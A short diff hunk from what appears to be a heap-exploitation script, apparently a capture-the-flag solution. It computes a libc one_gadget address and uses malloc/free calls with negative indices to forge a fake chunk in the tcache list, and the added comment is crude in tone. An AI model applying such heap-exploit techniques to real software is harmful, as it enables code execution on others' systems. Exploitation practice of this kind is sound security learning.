@@ -41,6 +41,7 @@ def main():
 
     one_gadget = libc.address + 0x10a38c
 
+    # NOT APPLICABLE TO FAST BINS, AS IT HAS MORE CHECKS THAN THIS SHIT
     malloc(928) # 1
     free(0) # 2 <- add fake chunk's size ; position influenced by size malloc'd
     free(-528) # 3 <- add fake chunk to tcache bin list
